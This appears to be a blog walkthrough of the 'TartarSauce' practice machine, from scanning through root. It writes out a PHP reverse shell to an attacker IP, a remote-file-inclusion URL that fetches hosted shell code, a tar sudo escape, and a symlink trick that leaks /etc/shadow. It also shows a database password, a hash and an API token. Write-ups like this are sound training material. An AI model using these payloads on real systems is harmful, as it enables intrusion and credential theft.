---
layout: post
title: "tartarsauce"
date: 2025-09-010 
categories: OSCP Playlist
---
# tartarsauce

# Summary

- Arbitrary file upload in monstra3.0.4 did not work
- wpscan --plugins-detection aggressive found gwoelle guestbook plugin
- RFI vuln in the plugin
- host php reverse shell, end exploited RFI
- sudo -l revealed tar with privilege
- GTFObin tar to raise privilege to new user
- pspy32s to find cron job executing as root
- exploit vulnerability in script, replace tar file with own malicious tar before it’s removed, to get SUID shell
- exploit error log produced by diff -r, to read shadow and root.txt from error log

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/tartarsauce 10.10.10.88

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
```

We get some hidden dir from robts.txt. 

The normal web page:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image.png)

Nothing in page source either. While we investigate other subdir from robots.txt, let’s fuzz for subdir in the background

Let’s visit the webservices dir; the only page not forbidden is the one shown below:

```bash
http://10.10.10.88/webservices/webservices/monstra-3.0.4/
```

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%201.png)

We get the version of the CMS as well:

```bash
Monstra 3.0.4
```

Playing around with the site, most hyperlink redirect to 404 Not found. Clicking on Pages Manager takes us to an admin login page:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%202.png)

We try default credential admin:admin, we are in:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%203.png)

We have upload file functionality. Let search up exploit associated with monstra 3.0.4 version. We find this:

https://www.exploit-db.com/exploits/43348

From the exploit, it seems we can bypass extension restriction by either using php7 or PHP, then we can execute php code. Let’s try and get a reverse shell. First create a php reverse shell payload:

```bash
<?php
$sock=fsockopen("10.10.16.7",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

```

Let’s also start a listener:

```bash
nc -lnvp 4444
```

Now upload the file. However, it was unsuccessful. Let’s turn on intercept on Burp and see why it failed:

Navigating around the site, we also find directories on the backend are writable:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%204.png)

Also .htaccess and index.php are also writable:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%205.png)

Let’s try creating a new page:

```bash
http://10.10.10.88/webservices/monstra-3.0.4/admin/test.PHP
```

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%206.png)

Does not work.

```bash
feroxbuster -u http://10.10.10.88 -C 404

200      GET      563l      128w    10766c http://10.10.10.88/
301      GET        9l       28w      316c http://10.10.10.88/webservices => http://10.10.10.88/webservices/
301      GET        9l       28w      319c http://10.10.10.88/webservices/wp => http://10.10.10.88/webservices/wp/
301      GET        9l       28w      328c http://10.10.10.88/webservices/wp/wp-admin => http://10.10.10.88/webservices/wp/wp-admin/
301      GET        9l       28w      331c http://10.10.10.88/webservices/wp/wp-includes => http://10.10.10.88/webservices/wp/wp-includes/
301      GET        9l       28w      334c http://10.10.10.88/webservices/wp/wp-includes/js => http://10.10.10.88/webservices/wp/wp-includes/js/
301      GET        9l       28w      335c http://10.10.10.88/webservices/wp/wp-includes/css => http://10.10.10.88/webservices/wp/wp-includes/css/
301      GET        9l       28w      338c http://10.10.10.88/webservices/wp/wp-includes/images => http://10.10.10.88/webservices/wp/wp-includes/images/
301      GET        9l       28w      337c http://10.10.10.88/webservices/wp/wp-includes/fonts => http://10.10.10.88/webservices/wp/wp-includes/fonts/
301      GET        9l       28w      341c http://10.10.10.88/webservices/wp/wp-includes/customize => http://10.10.10.88/webservices/wp/wp-includes/customize/
301      GET        9l       28w      339c http://10.10.10.88/webservices/wp/wp-includes/widgets => http://10.10.10.88/webservices/wp/wp-includes/widgets/
301      GET        9l       28w      330c http://10.10.10.88/webservices/wp/wp-content => http://10.10.10.88/webservices/wp/wp-content/
301      GET        9l       28w      338c http://10.10.10.88/webservices/wp/wp-content/plugins => http://10.10.10.88/webservices/wp/wp-content/plugins/
301      GET        9l       28w      337c http://10.10.10.88/webservices/wp/wp-content/themes => http://10.10.10.88/webservices/wp/wp-content/themes/
301      GET        9l       28w      338c http://10.10.10.88/webservices/wp/wp-content/uploads => http://10.10.10.88/webservices/wp/wp-content/uploads/
301      GET        9l       28w      337c http://10.10.10.88/webservices/wp/wp-admin/includes => http://10.10.10.88/webservices/wp/wp-admin/includes/
301      GET        9l       28w      333c http://10.10.10.88/webservices/wp/wp-admin/user => http://10.10.10.88/webservices/wp/wp-admin/user/
301      GET        9l       28w      338c http://10.10.10.88/webservices/wp/wp-content/upgrade => http://10.10.10.88/webservices/wp/wp-content/upgrade/
301      GET        9l       28w      336c http://10.10.10.88/webservices/wp/wp-admin/network => http://10.10.10.88/webservices/wp/wp-admin/network/
301      GET        9l       28w      334c http://10.10.10.88/webservices/wp/wp-admin/maint => http://10.10.10.88/webservices/wp/wp-admin/maint/
301      GET        9l       28w      331c http://10.10.10.88/webservices/wp/wp-admin/js => http://10.10.10.88/webservices/wp/wp-admin/js/
301      GET        9l       28w      344c http://10.10.10.88/webservices/wp/wp-includes/certificates => http://10.10.10.88/webservices/wp/wp-includes/certificates/
301      GET        9l       28w      336c http://10.10.10.88/webservices/wp/wp-includes/Text => http://10.10.10.88/webservices/wp/wp-includes/Text/
301      GET        9l       28w      335c http://10.10.10.88/webservices/wp/wp-admin/images => http://10.10.10.88/webservices/wp/wp-admin/images/
301      GET        9l       28w      332c http://10.10.10.88/webservices/wp/wp-admin/css => http://10.10.10.88/webservices/wp/wp-admin/css/

```

We find potential WordPress application on the site. Let’s try and visit wp/wp-admin:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%207.png)

We get a domain name. Let’s add that to /etc/hosts:

```bash
10.10.10.88 tartarsauce.htb
```

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%208.png)

Now that the wordpress application is verified, let’s also run wpscan in the background:

```bash
sudo wpscan --url http://tartarsauce.htb/webservices/wp --enumerate ap --plugins-detection aggressive --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs 

[i] User(s) Identified:

[+] wpadmin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://tartarsauce.htb/webservices/wp/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 
 [i] Plugin(s) Identified:

[+] akismet
 | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2025-05-07T16:30:00.000Z
 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
 |
 | Version: 1.5.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
 | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2025-06-23T16:09:00.000Z
 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.9.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

Let’s find plugins:

Searching up the vulnerable plugin, we find an exploit with RFI: https://www.exploit-db.com/exploits/38861

Let’s see if it works:

```bash
#First set up listener
nc -lnvp 80
```

Now type the URL:

```bash
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.7/soemthing

#see request from listener
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.88] 51944
GET /soemthingwp-load.php HTTP/1.0
Host: 10.10.16.7
Connection: close

```

Seems like it can connect to us. Let’s host a php reverse shell and see if it connects back to us. Let’s get download a php reverse shell from pentest monkey: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Now edit the IP and port. After, let’s host a python server, and start a listener:

```bash
python3 -m http.server 80 

#listener
nc -nlvp 4444
```

Now visit the URL:

```bash
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.7/shell.php
```

From our python server:

```bash
10.10.10.88 - - [10/Sep/2025 10:24:01] "GET /shell.phpwp-load.php HTTP/1.0" 404 -

```

Seems like it appends wp-load.php. Let’s change change our exploit name to wp-load.php and get it to request to /

```bash
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.7/
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%209.png)

Let’s start enumerating. We are user www-data. Let’s check open ports:

```bash
ss -lntp

State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      80     127.0.0.1:3306                     *:*                  
LISTEN     0      128          *:80                       *:* 
```

Let’s check if their are any subdomains:

```bash
ls /etc/apache2/sites-available

000-default.conf  default-ssl.conf

cat 000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Nothing.

Let’s check wp configuration files:

```bash
cat wp-config.php

/** MySQL database username */
define('DB_USER', 'wpuser');                                            
                                                                        
/** MySQL database password */
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');

```

We know there is a mysql running on the server, let’s login:

```bash
mysql -h localhost -u wpuser -p

show databases;

use wp;

show tables;

select * from wp_users;

wpadmin:$P$BBU0yjydBz9THONExe2kPEsvtjStGe1
```

Let’s crack the password with hashcat:

```bash
.\hashcat.exe wordlists\admin_hash.txt wordlists\rockyou.txt -m 400
```

No result.

Let’s check our sudo privlieges:

```bash
sudo -l

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

We can run tar as onuma.

Searching for the exploit steps in GTFObin, we find:

```bash
export TERM=xterm-color
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

IT worked:

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%2010.png)

Let’s start basic enumeration with this user:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)

ls -l
total 4
lrwxrwxrwx 1 root  root   9 Feb 17  2018 shadow_bkp -> /dev/null

```

We can’t list sudo privileges as we do not have user onuma’s password.

```bash
cat .mysql_history

_HiStOrY_V2_
create\040database\040backuperer;
exit

```

Let’s also check running processes:

```bash
ps -ef --forest
```

At this point, let’s upload [linpeas.sh](http://linpeas.sh) and see what it finds:

```bash
wget http://10.10.16.7/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

#interesting finds

-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer                            
-rw-r--r-- 1 root root 16097 Jan 21  2021 /var/backups/onuma_backup_error.txt                                                                    
-rw-r--r-- 1 root root 219 Sep 10 06:02 /var/backups/onuma_backup_test.txt                                                                       
-rw-r--r-- 1 onuma onuma 11511296 Sep 10 06:02 /var/backups/onuma-www-dev.bak 

/usr/bin/gettext.sh 

╔══════════╣ Searching tmux sessions                                                                                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                            
tmux 2.1                                                                                                                                         
                                                                                                                                                 
                                                                                                                                                 
/tmp/tmux-1000 
```

Let’s check out the backup file first:

```bash
file /var/backups/onuma-www-dev.bak

/var/backups/onuma-www-dev.bak: gzip compressed data, last modified: Wed Sep 10 10:02:51 2025, from Unix

gunzip -c onuma-www-dev.bak > onuma-www-dev

file  onuma-www-dev

onuma-www-dev: POSIX tar archive (GNU)
```

Just the backup of webservices. Let’s use pspy to check for cron jobs, since crontab and /etc/crontab did not show anything:

```bash
wget http://10.10.16.7/pspy32s

chmod +x pspy32s
./pspy32s

2025/09/10 06:18:01 CMD: UID=0     PID=25725  | /bin/bash /usr/sbin/backuperer 
2025/09/10 06:18:01 CMD: UID=0     PID=25727  | /bin/rm -rf /var/tmp/. /var/tmp/.. /var/tmp/check 
2025/09/10 06:18:01 CMD: UID=0     PID=25731  | /bin/bash /usr/sbin/backuperer 
2025/09/10 06:18:01 CMD: UID=0     PID=25730  | /bin/bash /usr/sbin/backuperer 
2025/09/10 06:18:01 CMD: UID=1000  PID=25734  | /bin/tar -zcvf /var/tmp/.34d18c813cd44d3be99cb0ea528278c637f4304a /var/www/html 

2025/09/10 06:18:01 CMD: UID=1000  PID=25735  | gzip 

q2025/09/10 06:18:31 CMD: UID=0     PID=25741  | gzip -d 
2025/09/10 06:18:31 CMD: UID=0     PID=25740  | /bin/tar -zxvf /var/tmp/.34d18c813cd44d3be99cb0ea528278c637f4304a -C /var/tmp/check 
2025/09/10 06:18:32 CMD: UID=0     PID=25743  | /bin/bash /usr/sbin/backuperer 
2025/09/10 06:18:32 CMD: UID=0     PID=25742  | /bin/bash /usr/sbin/backuperer 
2025/09/10 06:18:32 CMD: UID=0     PID=25744  | /bin/mv /var/tmp/.34d18c813cd44d3be99cb0ea528278c637f4304a /var/backups/onuma-www-dev.bak 
2025/09/10 06:18:32 CMD: UID=0     PID=25745  | /bin/rm -rf /var/tmp/check . .. 

```

We can also find out how often the script runs by using linenum.sh:

```bash
[-] Systemd timers:                                                                                                                              
NEXT                         LEFT      LAST                         PASSED       UNIT                         ACTIVATES                          
Wed 2025-09-10 06:33:06 EDT  10s left  Wed 2025-09-10 06:28:06 EDT  4min 49s ago backuperer.timer             backuperer.service                 
Wed 2025-09-10 06:38:26 EDT  5min left Wed 2025-09-10 04:06:56 EDT  2h 25min ago apt-daily-upgrade.timer      apt-daily-upgrade.service          
Wed 2025-09-10 16:22:13 EDT  9h left   Wed 2025-09-10 04:06:56 EDT  2h 25min ago apt-daily.timer              apt-daily.service
Thu 2025-09-11 04:21:56 EDT  21h left  Wed 2025-09-10 04:21:56 EDT  2h 10min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service     
                                                                                                                                                 
4 timers listed.                                                                                                                                 
Enable thorough tests to see inactive timers  
```

```bash
locate backuperer

/etc/systemd/system/multi-user.target.wants/backuperer.timer
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/usr/sbin/backuperer

cat /lib/systemd/system/backuperer.timer

[Unit]
Description=Runs backuperer every 5 mins

[Timer]
# Time to wait after booting before we run first time
OnBootSec=5min
# Time between running each consecutive time
OnUnitActiveSec=5min
Unit=backuperer.service

[Install]
WantedBy=multi-user.target
onuma@TartarSauce:~$ 

```

Let’s read the backuperer script:

```bash
cat /usr/sbin/backuperer

#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.  #var/tmp/check
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files. 
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

#sudo tar -zcvf /var/tmp/.$RAND_FILE /var/www/html & 

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir  
}

/bin/mkdir $check
#now extracting
#tar -xzvf /var/tmp/.$RAND -C NEWFILE=/var/tmp/check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi

```

What the program does:

- backs up everything from /var/www/html and create a new tar in /var/tmp/.$RandSHA1
- sleep for 30 seconds
- extract everything from the /var/tmp/.$RandSHA1 file to /var/tmp/check
- if the file structure of /var/www/html and /var/tmp/check/var/www/html is different, print error
- otherwise, clean up and save to a .bak file

So if we replace a our malicious /var/tmp/.$RandSHA1 with a SUID bash binary set, when the program extracts everything as root, we would have a SUID bash binary to execute. First let’s create our exploit. We first have to download gcc-multilib so we can compile 32-bit binary:

```bash
sudo apt install gcc-multilib
```

Now our SUID exploit:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main (void) {

	setuid(0,); setgid(0); system("/bin/sh");

}
```

Now compile as a 32-bit binary:

```bash
sudo gcc -m32 -o setuid setuid.c

mkdir -p var/www/html
mv setuid var/www/html
```

the tar command preserves the original ownership (user and group IDs) stored in the tarball, so let’s make sure root own all of this:

```bash
sudo chown -R root:root var/
sudo chmod +sx var/www/html/setuid

tar czvf setuid.tar.gz var
```

Now transfer the file over:

```bash
cd /var/tmp
wget http://10.10.16.7/setuid.tar.gz
```

We can use systemctl to see when the next backuperer executes:

```bash
systemctl list-timers
```

After a while:

```bash
-rw-r--r--  1 onuma onuma 11511296 Sep 10 10:04 .8de8d9532cb49041cc632169b7b8f23e5afea6ff
```

```bash
cp setuid.tar.gz .8de8d9532cb49041cc632169b7b8f23e5afea6ff
```

After 30 seconds, we have the check dir, and in it is our root binary.

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%2011.png)

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%2012.png)

```bash
./setuid
./setuid: /lib/i386-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./setuid)
```

Our version of ubuntu is too new, compiling a really old version would be too bothersome. 

Let’s try another way. Let’s try symlinking files inside /var/www/html to point to root.txt and /etc/shadow, since the diff -r will be outputting the differences to $bkpdir/onuma_backup_error.txt, we can get it to read the differences from each file.

```bash
cd /var/tmp/

mkdir -p var/www/html
cd var/www/html
#create symbolic link here

ln -s /etc/shadow index.html
ln -s /root/root.txt robots.txt
```

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%2013.png)

Now let’s tar it:

```bash
cd ../../..
tar -zcvf var.tar.gz var

cp var.tar.gz .8b55a6522e4cff90c004d0ec9036057a78812e48

```

Now we can see in the error log: 

```bash
cat /var/backups/onuma_backup_error.txt
```

![image.png]({{ site.baseurl }}/assets/tartarsauce/image%2014.png)